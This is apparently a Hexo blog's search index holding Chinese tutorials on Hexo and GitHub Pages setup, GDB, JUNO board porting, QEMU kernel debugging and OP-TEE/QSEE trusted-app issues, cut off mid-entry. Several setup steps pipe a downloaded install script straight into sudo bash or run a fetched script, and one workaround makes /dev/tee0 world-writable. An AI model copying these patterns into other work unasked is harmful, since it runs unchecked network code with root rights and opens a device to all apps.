<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/04/16/helloworld/"/>
      <url>/2024/04/16/helloworld/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><span id="more"></span><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>image test</p><p><img src="/test.png" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo github搭建博客</title>
      <link href="/2020/02/19/Hexo/"/>
      <url>/2020/02/19/Hexo/</url>
      
        <content type="html"><![CDATA[<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><blockquote><p>Ubuntu 18.04 </p></blockquote><h3 id="nodejs-npm"><a href="#nodejs-npm" class="headerlink" title="nodejs     npm"></a>nodejs     npm</h3><p> 根据<a href="https://hexo.io/zh-cn/docs/">hexo官方文档</a> ，建议使用 Node.js 10.0 及以上版本，而此时apt安装版本为8.14，故使用以下方法：</p><pre class="line-numbers language-shell"><code class="language-shell"># Using Ubuntucurl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -sudo apt-get install -y nodejsnodejs -vnpm -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><p>因为npm是国外的库，所以没有翻墙的话会很慢，更改为阿里源：</p><pre class="line-numbers language-sh"><code class="language-sh">npm config set registry http://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><pre><code>sudo npm install -g hexo-climkdir bloghexo init blogcd blognpm install</code></pre><p><code>blog</code>目录为<code>hexo</code>的工作空间，目录如下：</p><p>.<br>├── _config.yml<br>├── node_modules<br>├── package.json<br>├── package-lock.json<br>├── scaffolds<br>├── source<br>└── themes</p><p>其中，<code>_config.yml</code>是博客网站的配置文件,<code>source</code>文件夹是存放用户资源的地方，<code>_posts</code> 文件夹存放Markdown文件（.md），<code>scaffolds</code>是模板文件夹，当用hexo新建文章时，hexo会根据<code>scaffolds</code>文件夹下的文件来建立文件，<code>themes</code>文件夹是存放主题的文件夹，hexo根据主题生成静态页面。<br>关于_config.yml的补充说明：其中工作空间根目录下有一个_config.yml，是博客网站的配置文件，themes文件夹中对应不同主题的目录下也有一个_config.yml文件夹，是主题的配置文件。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><table><thead><tr><th align="left">命令</th><th align="center">作用</th><th align="center">简写</th></tr></thead><tbody><tr><td align="left">hexo init “folder-name”</td><td align="center">新建一个网站</td><td align="center"></td></tr><tr><td align="left">hexo new “title-name”</td><td align="center">新建一篇文章</td><td align="center"></td></tr><tr><td align="left">hexo generate</td><td align="center">生产静态网站</td><td align="center">hexo g</td></tr><tr><td align="left">hexo server</td><td align="center">启动本地服务器</td><td align="center">hexo s</td></tr><tr><td align="left">hexo deploy</td><td align="center">部署网站</td><td align="center">hexo d</td></tr><tr><td align="left">hexo clean</td><td align="center">清除缓存文件</td><td align="center"></td></tr></tbody></table><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><p>默认主题为<code>landscape</code> ，更换为<a href="https://github.com/theme-next/hexo-theme-next">NexT </a> 。</p><pre><code>#在 blog 目录下git clone https://github.com/theme-next/hexo-theme-next themes/next</code></pre><p>在工作目录<code>blog</code>下修改配置文件<code>_config.yml</code> 行theme: landscape 为</p><pre><code>theme: next</code></pre><p>重新生成网站：</p><pre><code>hexo cleanhexo ghexo s</code></pre><p>在浏览器中输入：<a href="http://localhost:4000/">http://localhost:4000</a></p><h3 id="git-配置"><a href="#git-配置" class="headerlink" title="git 配置"></a>git 配置</h3><pre><code>sudo apt install gitgit config --global user.name &quot;your name&quot;git config --global user.email &quot;your email&quot;ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot; # 创建git连接公钥# 将 ssh-key 加入到 ssh-agenteval &quot;$(ssh-agent -s)&quot;ssh-add ~/.ssh/id_rsa</code></pre><ol><li><p>公钥在<code>~/.ssh/id_rsa.pub</code>，打开该文件，复制全部内容。在github中，点击个人头像—&gt;settings—&gt;SSH and GPG keys—&gt;New SSH key，粘贴刚才复制的文本。</p><pre><code>ssh -T git@github.com # 测试是否成功连接</code></pre></li><li><p>在github页面，选择New repository，Respository name输入<code>username.github.io</code>，点击确定</p></li><li><p>编辑 <code>_config.yml</code> :</p><pre><code>deploy:  type: git  repository: git@github.com:username/username.github.io.git  branch: master</code></pre></li><li><p>安装hexo插件 </p><pre><code>npm install hexo-deployer-git --save</code></pre></li><li><p>部署</p><pre><code>hexo cleanhexo ghexo d</code></pre></li></ol><h3 id="上传源码"><a href="#上传源码" class="headerlink" title="上传源码"></a>上传源码</h3><p>​        不难发现这个博客仓库是不包含原始文件的，比如文章对应的 <strong>.md</strong> 文件，而该文件都只保存在配置 <strong>Hexo</strong> 的机器本地，而上传到 <strong>GitHub</strong> 的只是转换渲染过后的 <strong>.html</strong> 网页文件。而更换机器后的迁移需要源码</p><p>​    在 <strong>GitHub</strong> 仓库中创建新分支 <strong>hexo</strong>，并将部分站点源文件 (如source文件夹，最好写个 <strong>.gitignore</strong> 文件) 提交到该分支，在博客根目录下执行命令：</p><pre><code>$ rm -rf themes/next/.git # Git项目内不能再包含Git子项目$ git init$ git checkout -b hexo # 创建本地分支hexo $ git add .$ git commit -m &quot;create a new branch for coordination among multiple devices&quot; $ git remote add origin git@github.com:username/username.github.io  #添加远程仓库 $ git push origin hexo</code></pre><p>附： </p><pre><code>git push origin --delete hexo     # 删除远程仓库分支</code></pre><h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p><a href="https://www.jianshu.com/p/9f0e90cc32c2">链接</a></p><ol><li><p>设置 Menu</p><p>theme&#x2F;next&#x2F;_config.yml：</p><pre><code>menu:  home: / || home  about: /about/ || user  tags: /tags/ || tags  categories: /categories/ || th  archives: /archives/ || archive  #schedule: /schedule/ || calendar  #sitemap: /sitemap.xml || sitemap  #commonweal: /404/ || heartbeat</code></pre><p>相应源码：</p><pre><code>hexo new page &quot;tags&quot;hexo new page &quot;about&quot;hexo new page &quot;categories&quot;</code></pre><p>编辑生成的index.md</p></li><li><p>字数统计</p><pre><code>npm install hexo-symbols-count-time</code></pre></li><li><p>nexT 7.1以上只需仔细阅读主题的配置文件，开启相应开关就行</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB 调试</title>
      <link href="/2020/02/19/GDB%20%E8%B0%83%E8%AF%95/"/>
      <url>/2020/02/19/GDB%20%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h3 id="1-core-文件"><a href="#1-core-文件" class="headerlink" title="1. core 文件"></a>1. core 文件</h3><pre><code>ulimit -c #为0 则关闭了dump coreulimit -c unlimited #打开，当前shell有效gdb test test.core</code></pre><span id="more"></span><h3 id="2-交互命令"><a href="#2-交互命令" class="headerlink" title="2.交互命令"></a>2.交互命令</h3><ul><li>断点</li></ul><pre><code>break n （简写b n）:在第n行处设置断点（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578）b fn1 if a＞b：条件断点设置break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_buttondelete 断点号n：删除第n个断点disable 断点号n：暂停第n个断点enable 断点号n：开启第n个断点clear 行号n：清除第n行的断点info b （info breakpoints） ：显示当前程序的断点设置情况delete breakpoints：清除所有断点：</code></pre><ul><li>运行</li></ul><pre><code>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。continue （简写c ）：继续执行，到下一个断点处（或运行结束）next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。until+行号： 运行至某行，不仅仅用来跳出循环finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)quit：简记为 q ，退出gdb</code></pre><ul><li>分割窗口</li></ul><pre><code>layout：用于分割窗口，可以一边查看代码，一边测试：layout src：显示源代码窗口layout asm：显示反汇编窗口layout regs：显示源代码/反汇编和CPU寄存器窗口layout split：显示源代码和反汇编窗口Ctrl + L：刷新窗口</code></pre><ul><li>信息查看</li></ul><pre><code>print ax/nfu addrn：输出单元的个数。b）f：是输出格式。比如x是以16进制形式输出，o是以8进制形式输出,等等。c）u：标明一个单元的长度。b是一个byte，h是两个byte（halfword），w是四个byte（word），g是八个byte（giant word）。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> GDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JUNO 移植</title>
      <link href="/2020/02/19/JUNO%20%E7%A7%BB%E6%A4%8D/"/>
      <url>/2020/02/19/JUNO%20%E7%A7%BB%E6%A4%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前置工具安装"><a href="#1-前置工具安装" class="headerlink" title="1. 前置工具安装"></a>1. 前置工具安装</h2><pre class="line-numbers language-shell"><code class="language-shell">sudo apt install acpica-tools autoconf bc bison bridge-utils build-essential curl device-tree-compiler expect flex g++-multilib gcc-multilib genext2fs gperf libc6:i386 libssl-dev libstdc++6:i386 libncurses5:i386 libxml2 libxml2-dev libxml2-utils libxml-libxml-perl make openssh-server openssh-client python python-pip uuid-dev automake android-tools-adb android-tools-fastboot cython kernelshark libfreetype6-dev libpng-dev libtool net-tools nmap openjdk-8-jdk pkg-config python-dev python-mako python-matplotlib python-nose python-numpy python-wand python-wrapt screen sshpass trace-cmd tree<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><span id="more"></span><h2 id="2-源码下载"><a href="#2-源码下载" class="headerlink" title="2. 源码下载"></a>2. 源码下载</h2><pre><code>$ git clone https://git.linaro.org/landing-teams/working/arm/arm-reference-platforms.git$ cd arm-reference-platforms/#修改 sync_workspace.py 中215行 &#39;libpng-dev&#39; 为 &#39;libpng12-dev&#39;$ python3 sync_workspace.py#之后按照提示选择</code></pre><h2 id="3-编译使用"><a href="#3-编译使用" class="headerlink" title="3. 编译使用"></a>3. 编译使用</h2><h3 id="3-1-使用已编译的镜像"><a href="#3-1-使用已编译的镜像" class="headerlink" title="3.1  使用已编译的镜像"></a>3.1  使用已编译的镜像</h3><p>​     <code>python3 sync_workspace.py</code> 中选择 <code>use prebuilt configuration</code></p><p>使用空SD卡，执行<code>sudo dd if=juno.img of=/dev/sdb bs=64M</code> </p><p>启动开发板，cmd时</p><pre><code>Cmd&gt; flashFlash&gt; eraseallFlash&gt; quitCmd&gt; usb_on</code></pre><p>启动后，flash以u盘的形式可见，复制项目中<code>juno-ack-android-uboot</code> 文件夹下内容至u盘根目录下。</p><p>将SD卡插入开发板usb口</p><p>重启开发板，完成</p><h3 id="3-2-使用源码"><a href="#3-2-使用源码" class="headerlink" title="3.2 使用源码"></a>3.2 使用源码</h3><ul><li><p>下载 uboot, uefi, linux kernel, scp, optee源码</p><p><code>python3 sync_workspace.py</code> 中选择 <code>Build from source</code></p></li></ul><p>执行过程半小时或一小时左右，且最后checkout时出现 dirs变量未定义使用，由于 build-scripts文件夹下没有platform文件夹导致，但后续步骤未出现问题</p><p>build-scripts文件夹下执行 <code>./build-all.sh -p juno -f android all</code>  </p><p>拷贝recovery目录下文件至开发板flash中，并拷贝output&#x2F;juno&#x2F;juno-android下内容替换flash中SOFTWARE目录下同名文件。</p><ul><li>下载android 源码</li></ul><p>从<a href="http://releases.linaro.org/members/arm/android/juno/19.01/">http://releases.linaro.org/members/arm/android/juno/19.01/</a> 下载 linaro_android_build_cmds.sh； pinned-manifest.xml</p><p>执行 <code>./linaro_android_build_cmds.sh -m pinned-manifest.xml</code> 下载同时会进行编译</p><p>只编译：</p><pre><code>source build/envsetup.shlunch juno-userdebug(make -j4 droidcore boottarball showcommands) 2&gt;&amp;1 |tee build-juno.log</code></pre><p>打包成juno.img：</p><pre><code>$ cd android/out/target/product/juno/$ wget https://android-git.linaro.org/android/device/linaro/juno.git/plain/pack_juno_img.sh?h=linaro-oreo -O pack_juno_img.sh$ chmod a+x pack_juno_img.sh$ ./pack_juno_img.sh$ sudo dd if=juno.img of=/dev/sdb bs=64M</code></pre><p>不打包：</p><p>linaro-android-media-create –mmc &#x2F;dev&#x2F;sdX –image_size 2000M –dev vexpress –systemimage system.img –userdataimage userdata.img –boot boot.tar.bz2</p><h3 id="4-调试"><a href="#4-调试" class="headerlink" title="4. 调试"></a>4. 调试</h3><p> adb 连接: 网络调试</p><p>在android shell 中： setprop service.adb.tcp.port 5555</p><p>  stop adbd </p><p>  start adbd</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> JUNO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel 运行调试</title>
      <link href="/2020/02/19/Linux%20Kernel/"/>
      <url>/2020/02/19/Linux%20Kernel/</url>
      
        <content type="html"><![CDATA[<h2 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h2><pre><code>sudo apt-get install qemu libssl-dev libncurses5-dev gcc-5-aarch64-linux-gnu build-essential gdb-multiarchsudo update-alternatives --install /usr/bin/aarch64-linux-gnu-gcc aarch64-linux-gnu-gcc /usr/bin/aarch64-linux-gnu-gcc-5 5</code></pre><span id="more"></span><h2 id="BusyBox"><a href="#BusyBox" class="headerlink" title="BusyBox"></a>BusyBox</h2><pre><code>cd busybox-1_31_0/export ARCH=armexport CROSS_COMPILE=arm-linux-gnueabi-make menuconfig#build optios ---&gt;  static binary make -j4 &amp;&amp; make install</code></pre><h2 id="Linux-Kernel-https-github-com-figozhang-runninglinuxkernel-4-0"><a href="#Linux-Kernel-https-github-com-figozhang-runninglinuxkernel-4-0" class="headerlink" title="Linux Kernel(https://github.com/figozhang/runninglinuxkernel_4.0)"></a>Linux Kernel(<a href="https://github.com/figozhang/runninglinuxkernel_4.0">https://github.com/figozhang/runninglinuxkernel_4.0</a>)</h2><pre><code>cd linux-4.14.143#拷贝_install_arm64, 并拷贝etccd _install_arm64mkdir dev mntcd ..export ARCH=armexport CROSS_COMPILE=arm-linux-gnueabi-make vexpress_defconfigmake bzImage -j4 ARCH=arm CROSS_COMPILE=arm-linux-gnueabi-make dtbs</code></pre><h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><pre><code>qemu-system-arm -M vexpress-a9 -smp 4 -m 200M -kernel arch/arm/boot/zImage -append &quot;rdinit=/linuxrc console=ttyAMA0 loglevel=8&quot; -dtb arch/arm/boot/dts/vexpress-v2p-ca9.dtb -nographicqemu-system-arm -M vexpress-a9 -smp 4 -m 100M -kernel arch/arm/boot/zImage -dtb arch/arm/boot/dts/vexpress-v2p-ca9.dtb -nographic -append &quot;rdinit=/linuxrc console=ttyAMA0 loglevel=8 slub_debug kmemleak=on&quot; --fsdev local,id=kmod_dev,path=$PWD/kmodules,security_model=none -device virtio-9p-device,fsdev=kmod_dev,mount_tag=kmod_mount -s -S</code></pre><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><pre><code>git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim#.vimrc------------------------------------------------&quot; Vundle manageset nocompatible           &quot; be improved, requiredfiletype off&quot; set the runtime path to include Vundle and initializeset rtp+=~/.vim/bundle/Vundle.vimcall vundle#begin()&quot; let Vundle manage Vundle, requiredPlugin &#39;VundleVim/Vundle.vim&#39;&quot; All of your Plugins must be added before the following linecall vundle#end()             &quot; requiredfiletype plugin indent on      &quot; required------------------------------------------------------sudo apt-get install ctags$ ctags -R      &quot;在项目目录下$ :set tags=tags  &quot; vim中sudo apt install cscope$ cscope -Rbq    &quot;在项目目录下$ cscope add        cscope find</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TA 开发问题</title>
      <link href="/2020/02/19/TA%20%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98/"/>
      <url>/2020/02/19/TA%20%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="待解决-1-APP-访问-dev-tee0权限问题"><a href="#待解决-1-APP-访问-dev-tee0权限问题" class="headerlink" title="(待解决)1.  APP 访问 &#x2F;dev&#x2F;tee0权限问题"></a>(待解决)1.  APP 访问 &#x2F;dev&#x2F;tee0权限问题</h2><p>详细描述： android app 权限低于10000, &#x2F;dev&#x2F;tee0权限：</p><p><code>crw------- root     root     248,   0 1912-12-20 04:34 tee0</code></p><p>暂时解决办法： chmod 666 &#x2F;dev&#x2F;tee0</p><p>弊端：所有app都能读写&#x2F;dev&#x2F;tee0</p><p>思路：app添加<code>android:sharedUserId=&quot;android.uid.system&quot;</code> 使app为系统app，签名时android studio平台签名出现问题，可在源码中编译</p><span id="more"></span><h2 id="2-TA参数只能传4个"><a href="#2-TA参数只能传4个" class="headerlink" title="2. TA参数只能传4个"></a>2. TA参数只能传4个</h2><p>operation params 结构体默认为4个</p><p>解决办法：1. 修改optee源码，但不具有通用性</p><ol start="2"><li>将几个参数包装成结构体，注意结构体内不能有指针成员；或同类型合并同时传入长度</li></ol><h2 id="3-运行时出现trans-fault"><a href="#3-运行时出现trans-fault" class="headerlink" title="3. 运行时出现trans fault"></a>3. 运行时出现trans fault</h2><p>知识相关：optee运行时地址布局，页表映射机制</p><p>解决办法： TA_STACK_SIZE 指定了栈大小，而运行时超过该大小，将其值改大。</p><p>待解决：char *serial &#x3D;”&#x2F;proc&#x2F;cpuinfo”; TEE_MemMov(cpu, serial, 13)出现错误。</p><h2 id="4-全局变量"><a href="#4-全局变量" class="headerlink" title="4. 全局变量"></a>4. 全局变量</h2><p>详细描述： 每次进入SW重新加载TA，之前运行时获得的全局变量已被销毁。</p><p>解决方法：全局变量写入文件保存，用时读取，但效率太低。</p><p>寻找更好方法中……………… </p><p><strong>user_ta_header_defines.h</strong> 中：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> TA_FLAGS                    (TA_FLAG_SINGLE_INSTANCE | TA_FLAG_MULTI_SESSION | TA_FLAG_EXEC_DDR | TA_FLAG_INSTANCE_KEEP_ALIVE)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-参数传递"><a href="#5-参数传递" class="headerlink" title="5. 参数传递"></a>5. 参数传递</h2><p>字符串传递时末尾<code>‘\0’</code>  不会传递，不能使用<code>strlen()</code> 计算长度，将长度同时传递。</p><p><code>strlen</code> 长度不包括末尾<code>\0</code> </p><hr><h2 id="QSEE-TA"><a href="#QSEE-TA" class="headerlink" title="QSEE TA"></a>QSEE TA</h2><h3 id="1-添加新TA-helloCA"><a href="#1-添加新TA-helloCA" class="headerlink" title="1. 添加新TA [helloCA]"></a>1. 添加新TA [helloCA]</h3><p>路径core&#x2F;bsp&#x2F;trustzone&#x2F;qsapps&#x2F; 下新建目录结构：</p><p><img src="/file.png" alt="file"></p><p>SConscript内容相应如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> osImport<span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span>env <span class="token operator">=</span> env<span class="token punctuation">.</span>Clone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#env.Append(CFLAGS = " -Werror ")</span><span class="token comment" spellcheck="true">#------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># Check if we need to load this script or just bail-out</span><span class="token comment" spellcheck="true">#------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># alias - First alias is always the target then the other possible aliases</span>aliases <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token string">'helloCA'</span><span class="token punctuation">,</span> <span class="token string">'all'</span><span class="token punctuation">]</span>env<span class="token punctuation">.</span>InitImageVars<span class="token punctuation">(</span>  alias_list <span class="token operator">=</span> aliases<span class="token punctuation">,</span>       <span class="token comment" spellcheck="true"># list of aliases, unique name index [0]</span>  proc <span class="token operator">=</span> <span class="token string">'scorpion'</span><span class="token punctuation">,</span>               <span class="token comment" spellcheck="true"># proc settings</span>  config <span class="token operator">=</span> <span class="token string">'apps'</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true"># config settings</span>  build_tags <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'APPS_PROC'</span><span class="token punctuation">,</span>                <span class="token string">'HELLOCA_IMAGE'</span>               <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> env<span class="token punctuation">.</span>CheckAlias<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   Return<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># Configure and load in USES and path variables</span><span class="token comment" spellcheck="true">#------------------------------------------------------------------------------</span>env<span class="token punctuation">.</span>LoadToolScript<span class="token punctuation">(</span><span class="token string">'$&amp;#123;BUILD_ROOT&amp;#125;/core/bsp/build/scripts/secure_app_builder.py'</span><span class="token punctuation">)</span>env<span class="token punctuation">.</span>InitBuildConfig<span class="token punctuation">(</span><span class="token punctuation">)</span>env<span class="token punctuation">.</span>Append<span class="token punctuation">(</span>OUT_DIR<span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sconspath <span class="token operator">=</span> env<span class="token punctuation">.</span>subst<span class="token punctuation">(</span><span class="token string">'$&amp;#123;BUILD_ROOT&amp;#125;/core/securemsm/trustzone/qsapps/helloCA/src/SConscript'</span><span class="token punctuation">)</span>env<span class="token punctuation">.</span>Replace<span class="token punctuation">(</span>SRC_SCONS_ROOT <span class="token operator">=</span> sconspath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'SConscript'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>SConscript<span class="token punctuation">(</span> sconspath<span class="token punctuation">,</span> exports<span class="token operator">=</span><span class="token string">'env'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>env<span class="token punctuation">.</span>Deploy<span class="token punctuation">(</span><span class="token string">'SConscript'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   路径core&#x2F;securemsm&#x2F;trustzone&#x2F;qsapps&#x2F;为项目源码文件夹，新建文件结构：</p><p><img src="/file1.png" alt="file1"></p><p>SConscript内容如下：</p><pre class="line-numbers language-python"><code class="language-python">Import<span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span><span class="token keyword">if</span> env<span class="token punctuation">.</span>has_key<span class="token punctuation">(</span><span class="token string">'USES_NO_CP'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  env<span class="token punctuation">.</span>Append<span class="token punctuation">(</span>CCFLAGS <span class="token operator">=</span> <span class="token string">' -DUSES_NO_CP '</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#-------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># Compiler, object, and linker definitions</span><span class="token comment" spellcheck="true">#-------------------------------------------------------------------------------</span>includes <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token string">"$&amp;#123;BUILD_ROOT&amp;#125;/core/api/kernel/libstd/stringl"</span><span class="token punctuation">,</span>  <span class="token string">"$&amp;#123;BUILD_ROOT&amp;#125;/core/securemsm/trustzone/qsapps/helloCA/inc"</span><span class="token punctuation">,</span>  <span class="token string">'$&amp;#123;BUILD_ROOT&amp;#125;/core/securemsm/sse/log/inc'</span><span class="token punctuation">,</span>  <span class="token string">'$&amp;#123;BUILD_ROOT&amp;#125;/coreapi/securemsm/trustzone/qsee'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># We need to specify "neon" to generate SIMD instructions in 32-bit mode</span><span class="token comment" spellcheck="true">#------------------------------------------------------------------------------</span><span class="token keyword">if</span> env<span class="token punctuation">[</span><span class="token string">'PROC'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'scorpion'</span><span class="token punctuation">:</span>  env<span class="token punctuation">.</span>Append<span class="token punctuation">(</span>CCFLAGS <span class="token operator">=</span> <span class="token string">" -mfpu=neon "</span><span class="token punctuation">)</span>target_name <span class="token operator">=</span> <span class="token string">'helloCA'</span>app_name <span class="token operator">=</span> <span class="token string">'helloCA'</span><span class="token comment" spellcheck="true"># enable logging</span>env<span class="token punctuation">.</span>Append<span class="token punctuation">(</span>CPPDEFINES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'-DSSE_LOG_GLOBAL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>env<span class="token punctuation">.</span>Append<span class="token punctuation">(</span>CPPDEFINES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'-DSSE_LOG_FILE'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>env<span class="token punctuation">.</span>Append<span class="token punctuation">(</span>CPPDEFINES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'-DLOG_TAG=helloCA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#----------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># App core Objects</span><span class="token comment" spellcheck="true">#----------------------------------------------------------------------------</span>sources <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token string">'app_main.c'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#-------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># Add metadata to image</span><span class="token comment" spellcheck="true">#-------------------------------------------------------------------------------</span>md <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  <span class="token string">'appName'</span><span class="token punctuation">:</span>    app_name<span class="token punctuation">,</span>  <span class="token string">'privileges'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">'acceptBufSize'</span><span class="token punctuation">:</span> <span class="token number">8192</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">if</span> env<span class="token punctuation">[</span><span class="token string">'PROC'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'scorpion'</span><span class="token punctuation">:</span>  md<span class="token punctuation">[</span><span class="token string">'memoryType'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Unprotected'</span>deploy_header_files <span class="token operator">=</span> env<span class="token punctuation">.</span>Glob<span class="token punctuation">(</span><span class="token string">'../inc/*'</span><span class="token punctuation">)</span>helloCA_units <span class="token operator">=</span> env<span class="token punctuation">.</span>SecureAppBuilder<span class="token punctuation">(</span>  sources <span class="token operator">=</span> sources<span class="token punctuation">,</span>  includes <span class="token operator">=</span> includes<span class="token punctuation">,</span>  metadata <span class="token operator">=</span> md<span class="token punctuation">,</span>  image <span 